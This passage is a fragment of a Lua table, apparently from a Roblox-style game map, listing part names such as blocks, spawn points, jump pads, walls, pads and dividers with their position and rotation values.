                ["SmoothBlockModel82"] = {-57.0650024, 10.0300007, 64.7430038, 0, 0, 1, 0, 1, -0, -1, 0, 0},
                ["SmoothBlockModel127"] = {-23.0650005, 33.4300003, 72.2430038, 0, 0, 1, 0, 1, -0, -1, 0, 0},
                ["SmoothBlockModel95"] = {-27.0650005, 35.8300018, 72.2430038, 0, 0, 1, 0, 1, -0, -1, 0, 0},
                ["SmoothBlockModel114"] = {-30.0650005, 34.6300011, 45.2430038, 1, 0, 0, 0, 1, 0, 0, 0, 1},
                ["SmoothBlockModel37"] = {-30.0650005, 23.8300018, 45.2430038, 0, 0, 1, 0, 1, -0, -1, 0, 0},
                ["SmoothBlockModel36"] = {-30.0650005, 33.4300003, 45.2430038, 0, 0, 1, 0, 1, -0, -1, 0, 0},
                ["SmoothBlockModel130"] = {-13.0650005, 37.0300026, 51.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0},
                ["SmoothBlockModel56"] = {-30.0650005, 29.8300018, 45.2430038, 1, 0, 0, 0, 1, 0, 0, 0, 1},
                ["SmoothBlockModel53"] = {-19.0650005, 7.03000021, 44.7430038, 1, 0, 0, 0, 1, 0, 0, 0, 1},
                ["SmoothBlockModel35"] = {-57.0650024, 13.6300011, 58.7430038, 0, 0, -1, 0, 1, 0, 1, 0, 0},
                ["SmoothBlockModel34"] = {-45.0650024, 28.6300011, 48.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0},
                ["SmoothBlockModel32"] = {-43.0650024, 29.8300018, 45.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0},
                ["SmoothBlockModel54"] = {-39.0650024, 32.2300034, 66.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0},
                ["SmoothBlockModel120"] = {-30.0650005, 38.2300034, 60.2430038, 0, 0, 1, 0, 1, -0, -1, 0, 0},
                ["SmoothBlockModel49"] = {-57.0650024, 15.4300003, 58.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0},
                ["SmoothBlockModel29"] = {-30.0650005, 15.4300003, 45.2430038, -1, 0, 0, 0, 1, 0, 0, 0, -1},
                ["SmoothBlockModel27"] = {-41.0650024, 15.4300003, 45.2430038, 1, 0, 0, 0, 1, 0, 0, 0, 1},
                ["SmoothBlockModel26"] = {-30.0650005, 32.2300034, 45.2430038, 0, 0, 1, 0, 1, -0, -1, 0, 0},
                ["SmoothBlockModel51"] = {-30.0650005, 27.4300022, 45.2430038, 1, 0, 0, 0, 1, 0, 0, 0, 1},
                ["SmoothBlockModel21"] = {-47.0650024, 27.4300022, 45.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0},
                ["SmoothBlockModel17"] = {-49.0650024, 26.2300014, 48.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0},
                ["SmoothBlockModel83"] = {-19.0650005, 15.4300003, 45.2430038, 1, 0, 0, 0, 1, 0, 0, 0, 1},
                ["SmoothBlockModel16"] = {-47.0650024, 27.4300022, 54.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0},
                ["SmoothBlockModel50"] = {-21.5650005, 13.6300011, 45.2430038, 1, 0, 0, 0, 1, 0, 0, 0, 1},
                ["SmoothBlockModel115"] = {-3.06500006, 15.4300003, 58.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0},
                ["SmoothBlockModel15"] = {-50.5650024, 11.2300005, 45.2430038, 1, 0, 0, 0, 1, 0, 0, 0, 1},
                ["SmoothBlockModel14"] = {-30.0650005, 9.43000031, 45.2430038, -1, 0, 0, 0, 1, 0, 0, 0, -1},
                ["SmoothBlockModel13"] = {-44.0650024, 15.4300003, 45.2430038, 1, 0, 0, 0, 1, 0, 0, 0, 1},
                ["SmoothBlockModel42"] = {-41.0650024, 31.0300007, 48.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0},
                ["SmoothBlockModel12"] = {-53.0650024, 23.8300018, 48.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0},
                ["SmoothBlockModel64"] = {-57.0650024, 13.6300011, 63.7430038, 0, 0, 1, 0, 1, -0, -1, 0, 0},
                ["SmoothBlockModel11"] = {-50.5650024, 5.23000002, 45.2430038, 1, 0, 0, 0, 1, 0, 0, 0, 1},
                ["SmoothBlockModel28"] = {-49.0650024, 26.2300014, 60.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0},
                ["SmoothBlockModel113"] = {-3.06500006, 11.2300005, 51.7430038, 0, 0, -1, 0, 1, 0, 1, 0, 0},
                ["SmoothBlockModel10"] = {-44.5650024, 8.2300005, 45.2430038, 1, 0, 0, 0, 1, 0, 0, 0, 1},
                ["SmoothBlockModel7"] = {-43.5650024, 13.6300011, 45.2430038, 1, 0, 0, 0, 1, 0, 0, 0, 1},
                ["SmoothBlockModel6"] = {-57.0650024, 21.4300003, 48.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0},
                ["SmoothBlockModel99"] = {-2.56500006, 7.03000021, 61.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0},
                ["SmoothBlockModel143"] = {-30.0650005, 37.0300026, 45.2430038, 0, 0, 1, 0, 1, -0, -1, 0, 0},
                ["SmoothBlockModel3"] = {-41.0650024, 4.63000011, 44.2430038, -1, 0, 0, 0, 1, 0, 0, 0, -1},
                ["SmoothBlockModel122"] = {-3.06500006, 18.4300003, 73.2430038, 0, 0, 1, 0, 1, -0, -1, 0, 0},
                ["SmoothBlockModel9"] = {-41.0650024, 2.83000016, 42.2430038, -1, 0, 0, 0, 1, 0, 0, 0, -1},
                ["SmoothBlockModel19"] = {-51.0650024, 25.0300007, 45.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0},
                ["SmoothBlockModel8"] = {-44.5650024, 13.6300011, 45.2430038, 1, 0, 0, 0, 1, 0, 0, 0, 1},
                ["SmoothBlockModel45"] = {-15.5650005, 10.0300007, 45.2430038, -1, 0, 0, 0, 1, 0, 0, 0, -1},
                ["SmoothBlockModel72"] = {-15.5650005, 13.6300011, 45.2430038, -1, 0, 0, 0, 1, 0, 0, 0, -1},
                ["SmoothBlockModel18"] = {-51.0650024, 25.0300007, 54.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0},
                ["SmoothBlockModel103"] = {-30.0650005, 25.0300007, 45.2430038, 1, 0, 0, 0, 1, 0, 0, 0, 1},
                ["SmoothBlockModel33"] = {-55.0650024, 22.6300011, 54.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0},
                ["SmoothBlockModel31"] = {-30.0650005, 18.4300003, 45.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0},
                ["SmoothBlockModel71"] = {-3.06500006, 10.0300007, 64.7430038, 0, 0, 1, 0, 1, -0, -1, 0, 0},
                ["SmoothBlockModel30"] = {-30.0650005, 22.6300011, 45.2430038, 1, 0, 0, 0, 1, 0, 0, 0, 1},
                ["SmoothBlockModel60"] = {-57.0650024, 15.4300003, 61.2430038, 0, 0, 1, 0, 1, -0, -1, 0, 0},
                ["SmoothBlockModel59"] = {-47.0650024, 27.4300022, 66.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0},
                ["SmoothBlockModel86"] = {-11.0650005, 26.2300014, 72.2430038, 0, 0, 1, 0, 1, -0, -1, 0, 0},
                ["SmoothBlockModel52"] = {-19.0650005, 19.6300011, 72.2430038, 1, 0, 0, 0, 1, 0, 0, 0, 1},
                ["SmoothBlockModel23"] = {-45.0650024, 28.6300011, 60.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0},
                ["SmoothBlockModel79"] = {-37.0650024, 33.4300003, 48.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0},
                ["SmoothBlockModel4"] = {-37.5650024, 8.2300005, 45.2430038, -1, 0, 0, 0, 1, 0, 0, 0, -1},
                ["SmoothBlockModel2"] = {-55.0650024, 22.6300011, 45.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0},
                ["SmoothBlockModel20"] = {-20.5650005, 5.23000002, 45.2430038, 1, 0, 0, 0, 1, 0, 0, 0, 1},
                ["SmoothBlockModel24"] = {-57.0650024, 10.0300007, 57.7430038, 0, 0, -1, 0, 1, 0, 1, 0, 0},
                ["SmoothBlockModel47"] = {-53.0650024, 23.8300018, 60.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0},
                ["SmoothBlockModel5"] = {-41.0650024, 1.63000011, 39.243, -1, 0, 0, 0, 1, 0, 0, 0, -1},
                ["SmoothBlockModel25"] = {-43.0650024, 29.8300018, 54.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0},
                ["SmoothBlockModel70"] = {-8.56500053, 11.2300005, 45.2430038, -1, 0, 0, 0, 1, 0, 0, 0, -1},
                ["SmoothBlockModel73"] = {-16.5650005, 13.6300011, 45.2430038, -1, 0, 0, 0, 1, 0, 0, 0, -1},
                ["SmoothBlockModel22"] = {-30.0650005, 13.6300011, 45.2430038, -1, 0, 0, 0, 1, 0, 0, 0, -1},
                ["SmoothBlockModel126"] = {-57.0650024, 5.23000002, 71.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0},
                ["SmoothBlockModel1"] = {-41.0650024, 1.03000009, 37.243, -1, 0, 0, 0, 1, 0, 0, 0, -1},
                ["SmoothBlockModel232"] = {-30.1660023, 5.82995605, 70.4320068, 1, 0, 0, 0, 1, 0, 0, 0, 1},
                ["SmoothBlockModel231"] = {-43.0650024, 29.8300018, 78.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0},
                ["SmoothBlockModel230"] = {-49.0650024, 26.2300014, 96.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0},
                ["SmoothBlockModel229"] = {-53.0650024, 23.8300018, 96.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0},
                ["SmoothBlockModel227"] = {-43.0650024, 29.8300018, 99.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0},
                ["SmoothBlockModel226"] = {-30.0650005, 32.2300034, 99.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0},
                ["SmoothBlockModel225"] = {-51.0650024, 25.0300007, 99.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0},
                ["SmoothBlockModel224"] = {-50.5650024, 11.2300005, 99.2430038, 1, 0, 0, 0, 1, 0, 0, 0, 1},
                ["SmoothBlockModel223"] = {-30.0650005, 34.6300011, 99.2430038, 1, 0, 0, 0, 1, 0, 0, 0, 1},
                ["SmoothBlockModel222"] = {-55.0650024, 22.6300011, 99.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0},
                ["SmoothBlockModel221"] = {-37.0650024, 33.4300003, 96.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0},
                ["SmoothBlockModel218"] = {-44.0650024, 15.4300003, 99.2430038, 1, 0, 0, 0, 1, 0, 0, 0, 1},
                ["SmoothBlockModel217"] = {-43.5650024, 13.6300011, 99.2430038, 1, 0, 0, 0, 1, 0, 0, 0, 1},
                ["SmoothBlockModel216"] = {-39.0650024, 32.2300034, 99.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0},
                ["SmoothBlockModel214"] = {-35.0650024, 34.6300011, 99.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0},
                ["SmoothBlockModel213"] = {-30.0650005, 31.0300007, 99.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0},
                ["SmoothBlockModel211"] = {-30.0650005, 29.8300018, 99.2430038, 0, 0, 1, 0, 1, -0, -1, 0, 0},
                ["SmoothBlockModel208"] = {-30.0650005, 26.2300014, 99.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0},
                ["SmoothBlockModel204"] = {-22.5650005, 10.0300007, 99.2430038, 1, 0, 0, 0, 1, 0, 0, 0, 1},
                ["SmoothBlockModel203"] = {-30.0650005, 23.8300018, 99.2430038, 0, 0, 1, 0, 1, -0, -1, 0, 0},
                ["SmoothBlockModel201"] = {-30.1650009, 21.4300003, 99.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0},
                ["SmoothBlockModel196"] = {-30.0650005, 9.43000031, 99.2430038, -1, 0, 0, 0, 1, 0, 0, 0, -1},
                ["SmoothBlockModel193"] = {-43.0650024, 29.8300018, 90.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0},
                ["SmoothBlockModel191"] = {-30.0650005, 18.4300003, 99.2430038, 0, 0, 1, 0, 1, -0, -1, 0, 0},
                ["SmoothBlockModel187"] = {-33.0650024, 35.8300018, 96.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0},
                ["SmoothBlockModel185"] = {-44.5650024, 13.6300011, 99.2430038, 1, 0, 0, 0, 1, 0, 0, 0, 1},
                ["SmoothBlockModel205"] = {-30.0650005, 15.4300003, 99.2430038, 1, 0, 0, 0, 1, 0, 0, 0, 1},
                ["SmoothBlockModel197"] = {-30.0650005, 22.6300011, 99.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0},
                ["SmoothBlockModel184"] = {-55.0650024, 22.6300011, 90.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0},
                ["SmoothBlockModel180"] = {-33.0650024, 35.8300018, 84.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0},
                ["SmoothBlockModel174"] = {-57.0650024, 10.0300007, 86.7430038, 0, 0, 1, 0, 1, -0, -1, 0, 0},
                ["SmoothBlockModel171"] = {-57.0650024, 15.4300003, 83.2430038, 0, 0, 1, 0, 1, -0, -1, 0, 0},
                ["SmoothBlockModel167"] = {-47.0650024, 27.4300022, 90.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0},
                ["SmoothBlockModel164"] = {-9.56500053, 11.2300005, 99.2430038, 1, 0, 0, 0, 1, 0, 0, 0, 1},
                ["SmoothBlockModel161"] = {-3.06500006, 10.0300007, 86.7430038, 0, 0, 1, 0, 1, -0, -1, 0, 0},
                ["SmoothBlockModel159"] = {-3.06500006, 13.6300011, 85.7430038, 0, 0, 1, 0, 1, -0, -1, 0, 0},
                ["SmoothBlockModel157"] = {-39.0650024, 32.2300034, 90.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0},
                ["SmoothBlockModel155"] = {-30.0650005, 5.23000002, 99.2430038, -1, 0, 0, 0, 1, 0, 0, 0, -1},
                ["SmoothBlockModel154"] = {-30.0650005, 13.6300011, 99.2430038, -1, 0, 0, 0, 1, 0, 0, 0, -1},
                ["SmoothBlockModel173"] = {-57.0650024, 13.6300011, 86.7430038, 0, 0, 1, 0, 1, -0, -1, 0, 0},
                ["SmoothBlockModel152"] = {-41.0650024, 31.0300007, 84.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0},
                ["SmoothBlockModel151"] = {-57.0650024, 21.4300003, 84.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0},
                ["SmoothBlockModel150"] = {-57.5650024, 7.03000021, 83.2430038, 0, 0, 1, 0, 1, -0, -1, 0, 0},
                ["SmoothBlockModel206"] = {-37.5650024, 10.0300007, 99.2430038, -1, 0, 0, 0, 1, 0, 0, 0, -1},
                ["SmoothBlockModel148"] = {-3.06500006, 10.0300007, 79.7430038, 0, 0, -1, 0, 1, 0, 1, 0, 0},
                ["SmoothBlockModel177"] = {-35.0650024, 34.6300011, 78.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0},
                ["SmoothBlockModel144"] = {-3.06500006, 13.6300011, 80.7430038, 0, 0, -1, 0, 1, 0, 1, 0, 0},
                ["SmoothBlockModel198"] = {-16.0650005, 15.4300003, 99.2430038, -1, 0, 0, 0, 1, 0, 0, 0, -1},
                ["SmoothBlockModel142"] = {-3.06500006, 13.6300011, 86.7430038, 0, 0, 1, 0, 1, -0, -1, 0, 0},
                ["SmoothBlockModel141"] = {-37.0650024, 33.4300003, 72.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0},
                ["SmoothBlockModel138"] = {-55.0650024, 22.6300011, 78.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0},
                ["SmoothBlockModel136"] = {-51.0650024, 25.0300007, 78.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0},
                ["SmoothBlockModel134"] = {-3.06500006, 11.2300005, 93.7430038, 0, 0, 1, 0, 1, -0, -1, 0, 0},
                ["SmoothBlockModel133"] = {-47.0650024, 27.4300022, 78.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0},
                ["SmoothBlockModel132"] = {-3.06500006, 15.4300003, 86.2430038, 0, 0, 1, 0, 1, -0, -1, 0, 0},
                ["SmoothBlockModel145"] = {-57.0650024, 10.0300007, 79.7430038, 0, 0, -1, 0, 1, 0, 1, 0, 0},
                ["SmoothBlockModel146"] = {-57.0650024, 13.6300011, 80.7430038, 0, 0, -1, 0, 1, 0, 1, 0, 0},
                ["SmoothBlockModel175"] = {-57.0650024, 13.6300011, 85.7430038, 0, 0, 1, 0, 1, -0, -1, 0, 0},
                ["SmoothBlockModel202"] = {-30.0650005, 38.2300034, 96.2430038, 0, 0, 1, 0, 1, -0, -1, 0, 0},
                ["SmoothBlockModel209"] = {-30.0650005, 25.0300007, 99.2430038, 0, 0, 1, 0, 1, -0, -1, 0, 0},
                ["SmoothBlockModel168"] = {-39.0650024, 32.2300034, 78.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0},
                ["SmoothBlockModel186"] = {-57.0650024, 11.2300005, 93.7430038, 0, 0, -1, 0, 1, 0, 1, 0, 0},
                ["SmoothBlockModel139"] = {-41.0650024, 31.0300007, 72.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0},
                ["SmoothBlockModel188"] = {-30.0650005, 37.0300026, 99.2430038, 0, 0, 1, 0, 1, -0, -1, 0, 0},
                ["SmoothBlockModel195"] = {-19.0650005, 7.03000021, 99.7430038, -1, 0, 0, 0, 1, 0, 0, 0, -1},
                ["SmoothBlockModel219"] = {-57.0650024, 21.4300003, 96.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0},
                ["SmoothBlockModel200"] = {-51.0650024, 25.0300007, 90.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0},
                ["SmoothBlockModel183"] = {-21.5650005, 13.6300011, 99.2430038, 1, 0, 0, 0, 1, 0, 0, 0, 1},
                ["SmoothBlockModel101"] = {-3.06500006, 15.4300003, 83.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0},
                ["SmoothBlockModel207"] = {-30.0650005, 28.6300011, 99.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0},
                ["SmoothBlockModel153"] = {-30.0650005, 37.0300026, 90.2430038, 0, 0, 1, 0, 1, -0, -1, 0, 0},
                ["SmoothBlockModel194"] = {-16.5650005, 13.6300011, 99.2430038, -1, 0, 0, 0, 1, 0, 0, 0, -1},
                ["SmoothBlockModel210"] = {-30.0650005, 27.4300022, 99.2430038, 0, 0, 1, 0, 1, -0, -1, 0, 0},
                ["SmoothBlockModel181"] = {-41.0650024, 7.03000021, 99.7430038, -1, 0, 0, 0, 1, 0, 0, 0, -1},
                ["SmoothBlockModel93"] = {-57.0650024, 9.43000031, 72.2430038, 0, 0, 1, 0, 1, -0, -1, 0, 0},
                ["SmoothBlockModel90"] = {-45.0650024, 28.6300011, 72.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0},
                ["SmoothBlockModel156"] = {-35.0650024, 34.6300011, 90.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0},
                ["SmoothBlockModel166"] = {-15.5650005, 13.6300011, 99.2430038, -1, 0, 0, 0, 1, 0, 0, 0, -1},
                ["SmoothBlockModel179"] = {-57.0650024, 15.4300003, 86.2430038, 0, 0, 1, 0, 1, -0, -1, 0, 0},
                ["SmoothBlockModel220"] = {-41.0650024, 31.0300007, 96.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0},
                ["SmoothBlockModel163"] = {-49.0650024, 26.2300014, 84.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0},
                ["SmoothBlockModel91"] = {-49.0650024, 26.2300014, 72.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0},
                ["SmoothBlockModel228"] = {-41.0650024, 15.4300003, 99.2430038, -1, 0, 0, 0, 1, 0, 0, 0, -1},
                ["SmoothBlockModel94"] = {-30.0650005, 38.2300034, 72.2430038, 0, 0, 1, 0, 1, -0, -1, 0, 0},
                ["SmoothBlockModel189"] = {-45.0650024, 28.6300011, 96.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0},
                ["SmoothBlockModel190"] = {-30.0650005, 33.4300003, 99.2430038, 0, 0, 1, 0, 1, -0, -1, 0, 0},
                ["SmoothBlockModel107"] = {-57.0650024, 21.4300003, 72.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0},
                ["SmoothBlockModel96"] = {-33.0650024, 35.8300018, 72.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0},
                ["SmoothBlockModel149"] = {-30.0650005, 37.0300026, 78.2430038, 0, 0, 1, 0, 1, -0, -1, 0, 0},
                ["SmoothBlockModel158"] = {-30.0650005, 38.2300034, 84.2430038, 0, 0, 1, 0, 1, -0, -1, 0, 0},
                ["SmoothBlockModel215"] = {-47.0650024, 27.4300022, 99.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0},
                ["SmoothBlockModel212"] = {-44.5650024, 10.0300007, 99.2430038, 1, 0, 0, 0, 1, 0, 0, 0, 1},
                ["SmoothBlockModel169"] = {-53.0650024, 23.8300018, 84.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0},
                ["SmoothBlockModel172"] = {-45.0650024, 28.6300011, 84.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0},
                ["SmoothBlockModel199"] = {-15.5650005, 10.0300007, 99.2430038, -1, 0, 0, 0, 1, 0, 0, 0, -1},
                ["SmoothBlockModel182"] = {-38.5650024, 13.6300011, 99.2430038, -1, 0, 0, 0, 1, 0, 0, 0, -1},
                ["SmoothBlockModel121"] = {-2.56500006, 7.03000021, 83.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0},
                ["SmoothBlockModel92"] = {-53.0650024, 23.8300018, 72.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0},
                ["SmoothBlockModel170"] = {-37.0650024, 33.4300003, 84.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0},
                ["SmoothBlockModel192"] = {-19.0650005, 15.4300003, 99.2430038, -1, 0, 0, 0, 1, 0, 0, 0, -1},
                ["Spawn1"] = {-29, 0.0999880284, -25.5900097, -1, 0, 0, 0, 1, 0, 0, 0, -1},
                ["Spawn2"] = {-53, 0.0999999493, -25.5900097, -1, 0, 0, 0, 1, 0, 0, 0, -1},
                ["Spawn3"] = {-41, 0.0999999493, -25.5899963, -1, 0, 0, 0, 1, 0, 0, 0, -1},
                ["Regen"] = {-7.16499996, 5.42998981, 94.7429962, 0, 0, -1, 0, 1, 0, 1, 0, 0},
                ["Baseplate"] = {0, 0.100000001, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1},
                ["Jump"] = {-41.0650024, 1.30000007, -5.95700026, 0, 0, -1, 0, 1, 0, 1, 0, 0},
                ["Jump1"] = {-41.0650024, 1.30000007, 0.243000016, 0, 0, -1, 0, 1, 0, 1, 0, 0},
                ["Jump2"] = {-41.0650024, 1.30000007, -11.9570007, 0, 0, -1, 0, 1, 0, 1, 0, 0},
                ["Jump3"] = {-41.0650024, 1.30000007, 11.0430002, 0, 0, -1, 0, 1, 0, 1, 0, 0},
                ["Jump4"] = {-41.0650024, 1.30000007, 16.0430012, 0, 0, -1, 0, 1, 0, 1, 0, 0},
                ["Jump5"] = {-41.0650024, 1.30000007, 6.24300051, 0, 0, -1, 0, 1, 0, 1, 0, 0},
                ["Jump6"] = {-41.0650024, 1.30000007, 21.2430019, 0, 0, -1, 0, 1, 0, 1, 0, 0},
                ["Jump7"] = {-41.0650024, 1.30000007, 26.4430008, 0, 0, -1, 0, 1, 0, 1, 0, 0},
                ["Jump8"] = {-41.0650024, 1.30000007, 31.2430019, 0, 0, -1, 0, 1, 0, 1, 0, 0},
                ["Jump9"] = {-41.0650024, 1.30000007, -17.757, 0, 0, -1, 0, 1, 0, 1, 0, 0},
                ["Left Wall"] = {-23.0650024, 16.5000019, 0.243000031, 0, 0, 1, 0, 1, -0, -1, 0, 0},
                ["Right Wall"] = {-59.0650101, 16.5000038, 0.243000031, 0, 0, 1, 0, 1, -0, -1, 0, 0},
                ["Ceiling Wall"] = {-41.0649872, 31.6999989, 1.24301004, 1, 0, 0, 0, 1, 0, 0, 0, 1},
                ["Back Wall"] = {-41.0649948, 16.5000076, -30.757, -1, 0, 0, 0, 1, 0, 0, 0, -1},
                ["Pad8"] = {-40.7649879, 5.42999983, 94.3430023, 0, 0, -1, 0, 1, 0, 1, 0, 0},
                ["Pad7"] = {-36.7649803, 5.42999983, 94.3430023, 0, 0, -1, 0, 1, 0, 1, 0, 0},
                ["Pad6"] = {-32.7649765, 5.42999983, 94.3430023, 0, 0, -1, 0, 1, 0, 1, 0, 0},
                ["Pad3"] = {-20.7649632, 5.42999983, 94.3430023, 0, 0, -1, 0, 1, 0, 1, 0, 0},
                ["Pad9"] = {-44.7649994, 5.42999983, 94.3430023, 0, 0, -1, 0, 1, 0, 1, 0, 0},
                ["Pad1"] = {-12.7649641, 5.42999983, 94.3430023, 0, 0, -1, 0, 1, 0, 1, 0, 0},
                ["Pad5"] = {-28.7649689, 5.42999983, 94.3430023, 0, 0, -1, 0, 1, 0, 1, 0, 0},
                ["Pad2"] = {-16.7649612, 5.42999983, 94.3430023, 0, 0, -1, 0, 1, 0, 1, 0, 0},
                ["Pad4"] = {-24.764967, 5.42999983, 94.3430023, 0, 0, -1, 0, 1, 0, 1, 0, 0},
                ["SmoothBlockModel40"] = {-30.0650005, 1.03000009, 72.2430038, 1, 0, 0, 0, 1, 0, 0, 0, 1},
                ["SmoothBlockModel38"] = {-30.0650005, 2.83000016, 72.2430038, -1, 0, 0, 0, 1, 0, 0, 0, -1},
                ["SmoothBlockModel112"] = {-30.0650005, 4.63000011, 72.2430038, 0, 0, 1, 0, 1, -0, -1, 0, 0},
                ["Divider1"] = {-10.7649708, 6.42999983, 93.8430023, 0, 0, 1, 0, 1, -0, -1, 0, 0},
                ["Divider2"] = {-14.7649689, 6.42999983, 93.8430023, 0, 0, 1, 0, 1, -0, -1, 0, 0},
                ["Divider3"] = {-18.7649689, 6.42999983, 93.8430023, 0, 0, 1, 0, 1, -0, -1, 0, 0},
                ["Divider4"] = {-22.7649727, 6.42999983, 93.8430023, 0, 0, 1, 0, 1, -0, -1, 0, 0},
                ["Divider5"] = {-26.7649746, 6.42999983, 93.8430023, 0, 0, 1, 0, 1, -0, -1, 0, 0},
                ["Divider6"] = {-30.7649822, 6.42999983, 93.8430023, 0, 0, 1, 0, 1, -0, -1, 0, 0},
                ["Divider7"] = {-34.7649841, 6.42999983, 93.8430023, 0, 0, 1, 0, 1, -0, -1, 0, 0},
                ["Divider8"] = {-38.7649918, 6.42999983, 93.8430023, 0, 0, 1, 0, 1, -0, -1, 0, 0},
                ["Divider9"] = {-42.7650032, 6.42999983, 93.8430023, 0, 0, 1, 0, 1, -0, -1, 0, 0},
                ["Divider10"] = {-46.7649994, 6.42999983, 93.8430023, 0, 0, 1, 0, 1, -0, -1, 0, 0},
                ["Back"] = {-28.7649994, 6.42999983, 96.3430023, 1, 0, 0, 0, 1, 0, 0, 0, 1},
                ["SmoothBlockModel85"] = {-3.06500006, 9.43000031, 72.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0},
                ["Part57"] = {-101.076004, 1.20200002, 13.4760008, 0, 0, -1, 0, 1, 0, 1, 0, 0},
                ["Part55"] = {-101.076004, 1.70000005, 17.4740009, 1, 0, 0, 0, 1, 0, 0, 0, 1},
                ["Part54"] = {-97.576004, 0.900000036, 17.9740009, 1, 0, 0, 0, 1, 0, 0, 0, 1},
                ["Part53"] = {-95.0770035, 0.90200007, 7.47400045, 1, 0, 0, 0, -1, 0, 0, 0, -1},
                ["Part52"] = {-95.076004, 1.20200002, 10.4760008, 0, 0, -1, 0, 1, 0, 1, 0, 0},
                ["Part50"] = {-89.576004, 1.20000005, 17.9740009, 0, 0, 1, 0, 1, -0, -1, 0, 0},
                ["Part47"] = {-93.576004, 1.20000005, 17.9740009, 1, 0, 0, 0, 1, 0, 0, 0, 1},
                ["Part49"] = {-85.576004, 1.20000005, 17.9740009, 0, 0, 1, 0, -1, 0, 1, 0, -0},
                ["Part46"] = {-93.576004, 1.20000005, 13.9740009, 0, 0, 1, 0, 1, -0, -1, 0, 0},
                ["Part44"] = {-74.576004, 1.30000007, 14.9740009, 1, 0, 0, 0, 1, 0, 0, 0, 1},
                ["Part43"] = {-78.576004, 1.30000007, 14.9740009, 1, 0, 0, 0, 1, 0, 0, 0, 1},
                ["Part40"] = {-85.576004, 1.20000005, 13.9740009, -1, 0, 0, 0, 1, 0, 0, 0, -1},
                ["Part60"] = {-101.076004, 0.90200007, 7.47600031, 1, 0, 0, 0, -1, 0, 0, 0, -1},
                ["Part36"] = {-89.0770035, 1.20200002, 10.4740009, 0, 0, -1, 0, 1, 0, 1, 0, 0},
                ["Part56"] = {-101.076004, 0.90200007, 10.4760008, 1, 0, 0, 0, -1, 0, 0, 0, -1},
                ["Part35"] = {-86.0780029, 0.900000036, 7.47600031, 1, 0, 0, 0, -1, 0, 0, 0, -1},
                ["Part33"] = {-77.0770035, 1.20200002, 10.4740009, 0, 0, -1, 0, 1, 0, 1, 0, 0},
                ["Part32"] = {-83.0770035, 1.20200002, 10.4740009, 0, 0, -1, 0, 1, 0, 1, 0, 0},
                ["Part41"] = {-89.576004, 0.900000036, 13.9740009, 0, 0, -1, 0, 1, 0, 1, 0, 0},
                ["Part31"] = {-77.076004, 2.70000005, 7.47400045, 0, 0, -1, 0, 1, 0, 1, 0, 0},
